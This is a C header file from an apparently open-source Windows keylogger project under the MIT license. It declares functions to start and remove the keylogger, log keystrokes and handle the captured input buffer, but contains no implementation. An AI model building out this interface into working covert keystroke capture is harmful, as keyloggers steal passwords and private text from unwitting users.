/*******************************************************************************
     The MIT License (MIT)

    Copyright (c) 2017 Gikoskos <georgekoskerid@outlook.com>

    Permission is hereby granted, free of charge, to any person obtaining a copy
    of this software and associated documentation files (the "Software"), to deal
    in the Software without restriction, including without limitation the rights
    to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
    copies of the Software, and to permit persons to whom the Software is
    furnished to do so, subject to the following conditions:
    The above copyright notice and this permission notice shall be included in all
    copies or substantial portions of the Software.
    THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
    IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
    FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
    AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
    LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
    OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
    SOFTWARE.
 *********************************************************************************/

#ifndef __WINKEYLOGGER_HDR_H__
#define __WINKEYLOGGER_HDR_H__

#ifndef UNICODE
# define UNICODE 1
#endif //UNICODE

#ifndef _UNICODE
# define _UNICODE 1
#endif //_UNICODE

#include <windows.h>
//uncomment these lines if you're compiling on win8+
//#include <synchapi.h>
//#include <processthreadsapi.h>



#define INPUT_BUFFER_SIZE 255

BOOL StartWinKeylogger(void);
void RemoveWinKeylogger(void);
BOOL LogNextKeystroke(size_t *buff_len);
BOOL StrCmpInputBuffer(WCHAR *szBuff);
void StrCpyLoggedBuffer(WCHAR *szBuff);



#endif //__WINKEYLOGGER_HDR_H__
